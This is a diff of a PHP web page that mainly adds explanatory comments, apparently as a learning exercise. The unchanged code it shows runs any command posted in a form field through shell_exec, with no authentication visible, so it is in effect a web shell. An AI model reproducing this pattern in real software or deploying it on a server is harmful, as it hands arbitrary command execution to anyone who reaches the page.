@@ -124,19 +124,27 @@
         $command = $_POST["command"] ?? "";
         # creates an output variable storing the output of passing the user entered command to a shell
         $output = shell_exec($command);
-    # if the output is not not or empty, then 
+    # if the output is not null or empty, then continue
     if ($output !== null && $output !== "") {
+        # this formats the output for readability
+        # htmlspecialchars converts special characters into safe HTML
         echo "<pre>" .
              htmlspecialchars($output, ENT_QUOTES, "UTF-8") .
              "</pre>";
     }
 }
+# this ends the php section 
 ?>
-
+    <!-- 
+    This section defines the showCommandBox function, which grabs the div element
+    with id "commandBox" created earlier
+    -->
     <script>
         function showCommandBox() {
             document.getElementById("commandBox").style.display = "block";
         }
     </script>
+<!-- This marks the end of the HTML body-->
 </body>
+<!--This marks the end of the HTML document -->
 </html>
